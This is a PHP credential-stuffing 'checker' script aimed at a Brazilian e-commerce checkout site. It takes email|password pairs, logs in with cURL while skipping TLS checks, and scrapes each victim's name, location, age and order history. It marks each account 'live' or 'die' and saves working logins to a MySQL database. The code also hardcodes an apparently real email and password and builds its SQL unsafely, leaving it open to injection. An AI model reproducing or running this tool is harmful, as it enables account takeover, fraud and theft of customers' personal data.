<?php

if(!empty($_GET["login"])){
	$login = $_GET["login"];
	$email = explode("|", $login)[0];
	$senha = explode("|", $login)[1];

// Post request using CURL
	error_reporting(0);

	$login = "samueldiascabrera@yahoo.com.br|samudc";
	//$email = explode("|", $login)[0];
	//$senha = explode("|", $login)[1];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://checkout.{REDEACTED}.com.br/slogin");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/60.0.3112.113 Chrome/60.0.3112.113 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_COOKIESESSION, false );
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/{REDEACTED}.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/{REDEACTED}.txt');
	curl_setopt($ch, CURLOPT_REFERER, 'https://checkout.{REDEACTED}.com.br/slogin');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "NomeRedeSocial=&IdClienteRedesSociais=&SocialData=&ReturnUrl=&Login=$email&Cadastro=false&Cep=&Senha=$senha");
	$data = curl_exec($ch);

	curl_close($ch);




	function getStr($string,$start,$end){
		$str = explode($start,$string);
		$str = explode($end,$str[1]);
		return $str[0];
		}
	$Nome = getStr($data,'"nome":"','",');
	$sexo = getStr($data,'"sexo":"','",');
	$cidade = getStr($data,'"cidade":"','",');
	$estado = getStr($data, '"estado":"','",');
	$idade = getStr($data, '"idade":', ',');

	function GetCompras(){

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://checkout.{REDEACTED}.com.br/minha-conta/meus-pedidos");
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/60.0.3112.113 Chrome/60.0.3112.113 Safari/537.36");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/{REDEACTED}.txt');
		$data = curl_exec($ch);
		curl_close($ch);

		return $data;

	}

	$compras = GetCompras();

	
	if (stristr($compras, "Valor total:") !== false){
		$compras = "ON";
	}else{
		$compras = "OFF";
	}

	if(stristr($data, "ECOMMERCE.{REDEACTED}.AUTH=") !== false)
		{

		 	$array = array(
		 		"status" => "live",
		 	 	"result" => $email."|".$senha." - Nome: ".$Nome." | Estado: ".$estado." | Cidade: ".$cidade." | Compras: ".$compras
		 	);

		 	echo json_encode($array);


/* Insert DB information */

/*
		 	try{
				$dsn    = "mysql:dbname=Dooping;host=localhost";
				$dbUser = "root";
				$dbPass = "xxx";

				$pdo = new PDO($dsn, $dbUser, $dbPass);
				$sql = "INSERT INTO vds SET email = '$email', senha = '$senha', estado = '$estado', compras = '$compras'";
				$sql = $pdo -> query($sql);
			}catch(PDOException $e){
				echo "Falha: ".$e -> getMessage();
			}
		*/

			$dsn    = "mysql:dbname=Dooping;host=localhost";
			$dbUser = "root";
			$dbPass = "xxx";

			try{

				$pdo = new PDO($dsn, $dbUser, $dbPass);
				$sql = "SELECT * FROM vds WHERE email='$email'";
				$sql = $pdo -> query($sql);

				if($sql -> rowCount() > 0){
					foreach ($sql -> fetchAll() as $titulo){
						echo " ";
					}
				}else{
					try{
						$pdo = new PDO($dsn, $dbUser, $dbPass);
						$sql = "INSERT INTO vds SET email = '$email', senha = '$senha', estado = '$estado', detalhes = '$detalhes'";
						$sql = $pdo -> query($sql);
					}catch(PDOException $e){
						echo "Falha: ".$e -> getMessage();
					}
				}
			}catch(PDOException $e){
				echo "Falha: ".$e -> getMessage();

			}


		}else{
		 	
		 	$array = array(
		 		"status" => "die",
		 	 	"result" => $email."|".$senha
		 	);

		 	echo json_encode($array);
		 }
		 


}

?>
